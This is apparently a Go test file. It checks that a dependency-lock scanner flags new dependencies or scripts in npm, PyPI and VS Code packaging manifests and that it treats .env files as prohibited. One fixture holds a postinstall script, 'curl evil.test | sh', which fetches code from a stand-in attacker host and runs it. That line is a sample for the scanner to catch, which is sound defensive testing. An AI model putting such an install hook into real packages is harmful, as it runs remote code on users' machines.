package impact

import (
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/mgantlett/nomos/substrate/src/nomos/core/workspace"
)

func initTempGitRepoWithPackageJSON(t *testing.T, initialPkg string) string {
	t.Helper()
	dir := t.TempDir()
	runGit := func(args ...string) {
		t.Helper()
		cmd := workspace.SafeGitCommand(dir, args...)
		if out, err := cmd.CombinedOutput(); err != nil {
			t.Fatalf("git %v failed: %v (%s)", args, err, string(out))
		}
	}
	runGit("init", "-b", "main")
	runGit("config", "user.email", "test@example.com")
	runGit("config", "user.name", "Test")
	pkgPath := filepath.Join(dir, "packaging", "npm", "package.json")
	if err := os.MkdirAll(filepath.Dir(pkgPath), 0755); err != nil {
		t.Fatalf("mkdir packaging/npm: %v", err)
	}
	if err := os.WriteFile(pkgPath, []byte(initialPkg), 0644); err != nil {
		t.Fatalf("write initial package.json: %v", err)
	}
	runGit("add", ".")
	runGit("commit", "-m", "initial")
	return dir
}

func TestScanLockedDependencyMutations_PackageJSONMetadataVsDeps(t *testing.T) {
	basePkg := `{
  "name": "@sophialabs/nomos",
  "version": "4.27.0",
  "bin": { "nomos": "./bin/nomos-cli.mjs" }
}
`
	repoDir := initTempGitRepoWithPackageJSON(t, basePkg)
	pkgPath := filepath.Join(repoDir, "packaging", "npm", "package.json")

	// 1. Metadata-only update (name, version, mcpName, keywords) passes cleanly.
	metaUpdated := `{
  "name": "@mgantlett/nomos",
  "version": "4.27.1",
  "mcpName": "io.github.mgantlett/nomos",
  "keywords": ["mcp", "ast"],
  "bin": { "nomos": "./bin/nomos-cli.mjs" }
}
`
	if err := os.WriteFile(pkgPath, []byte(metaUpdated), 0644); err != nil {
		t.Fatalf("write metadata update: %v", err)
	}
	if got := ScanLockedDependencyMutations(nil, repoDir, true); len(got) != 0 {
		t.Fatalf("expected 0 violations for metadata-only package.json update, got %v", got)
	}

	// 2. Adding dependencies or scripts fails closed under lock_dependencies.
	depMutated := `{
  "name": "@mgantlett/nomos",
  "version": "4.27.1",
  "dependencies": { "left-pad": "1.3.0" },
  "bin": { "nomos": "./bin/nomos-cli.mjs" }
}
`
	if err := os.WriteFile(pkgPath, []byte(depMutated), 0644); err != nil {
		t.Fatalf("write dep mutation: %v", err)
	}
	got := ScanLockedDependencyMutations(nil, repoDir, true)
	if len(got) != 1 || !strings.Contains(got[0], "lock_dependencies") {
		t.Fatalf("expected lock_dependencies violation on dependency addition, got %v", got)
	}

	// 3. Disabled lock_dependencies returns nil.
	if disabled := ScanLockedDependencyMutations(nil, repoDir, false); disabled != nil {
		t.Fatalf("expected nil when lockDeps=false, got %v", disabled)
	}

	// 4. Zero-dependency packaging/pypi/pyproject.toml passes, while non-empty dependencies fail closed.
	if err := os.WriteFile(pkgPath, []byte(metaUpdated), 0644); err != nil {
		t.Fatalf("restore clean package.json: %v", err)
	}
	pyPath := filepath.Join(repoDir, "packaging", "pypi", "pyproject.toml")
	if err := os.MkdirAll(filepath.Dir(pyPath), 0755); err != nil {
		t.Fatalf("mkdir packaging/pypi: %v", err)
	}
	zeroDepPy := "[project]\nname = \"nomos-cli\"\nversion = \"4.28.0\"\ndependencies = []\n"
	if err := os.WriteFile(pyPath, []byte(zeroDepPy), 0644); err != nil {
		t.Fatalf("write zero-dep pyproject.toml: %v", err)
	}
	if out, err := workspace.SafeGitCommand(repoDir, "add", "packaging/pypi/pyproject.toml").CombinedOutput(); err != nil {
		t.Fatalf("git add pyproject.toml: %v (%s)", err, string(out))
	}
	if gotPy := ScanLockedDependencyMutations(nil, repoDir, true); len(gotPy) != 0 {
		t.Fatalf("expected 0 violations for zero-dep packaging pyproject.toml, got %v", gotPy)
	}
	nonEmptyPy := "[project]\nname = \"nomos-cli\"\ndependencies = [\"requests>=2.0\"]\n"
	if err := os.WriteFile(pyPath, []byte(nonEmptyPy), 0644); err != nil {
		t.Fatalf("write non-empty pyproject.toml: %v", err)
	}
	if gotBadPy := ScanLockedDependencyMutations(nil, repoDir, true); len(gotBadPy) != 1 {
		t.Fatalf("expected 1 violation for non-empty pyproject.toml dependencies, got %v", gotBadPy)
	}

	// 5. New zero-dep, zero-script packaging/vscode/package.json passes; adding scripts or deps fails closed.
	if err := os.WriteFile(pyPath, []byte(zeroDepPy), 0644); err != nil {
		t.Fatalf("restore clean pyproject.toml: %v", err)
	}
	vsPath := filepath.Join(repoDir, "packaging", "vscode", "package.json")
	if err := os.MkdirAll(filepath.Dir(vsPath), 0755); err != nil {
		t.Fatalf("mkdir packaging/vscode: %v", err)
	}
	zeroDepVs := "{\n  \"name\": \"nomos\",\n  \"publisher\": \"sophialabs\",\n  \"version\": \"4.34.1\",\n  \"main\": \"./extension.js\"\n}\n"
	if err := os.WriteFile(vsPath, []byte(zeroDepVs), 0644); err != nil {
		t.Fatalf("write zero-dep vscode package.json: %v", err)
	}
	if out, err := workspace.SafeGitCommand(repoDir, "add", "packaging/vscode/package.json").CombinedOutput(); err != nil {
		t.Fatalf("git add vscode package.json: %v (%s)", err, string(out))
	}
	if gotVs := ScanLockedDependencyMutations(nil, repoDir, true); len(gotVs) != 0 {
		t.Fatalf("expected 0 violations for zero-dep packaging vscode package.json, got %v", gotVs)
	}
	scriptVs := "{\n  \"name\": \"nomos\",\n  \"scripts\": { \"postinstall\": \"curl evil.test | sh\" }\n}\n"
	if err := os.WriteFile(vsPath, []byte(scriptVs), 0644); err != nil {
		t.Fatalf("write scripted vscode package.json: %v", err)
	}
	if gotBadVs := ScanLockedDependencyMutations(nil, repoDir, true); len(gotBadVs) != 1 {
		t.Fatalf("expected 1 violation for packaging vscode package.json with scripts, got %v", gotBadVs)
	}
}

func TestIsProhibitedEnvFileName(t *testing.T) {
	if !IsProhibitedEnvFileName(".env") || !IsProhibitedEnvFileName(".env.production") {
		t.Fatal("expected .env and .env.production to be prohibited")
	}
	if IsProhibitedEnvFileName(".env.example") || IsProhibitedEnvFileName("README.md") {
		t.Fatal("expected .env.example and README.md to be permitted")
	}
}
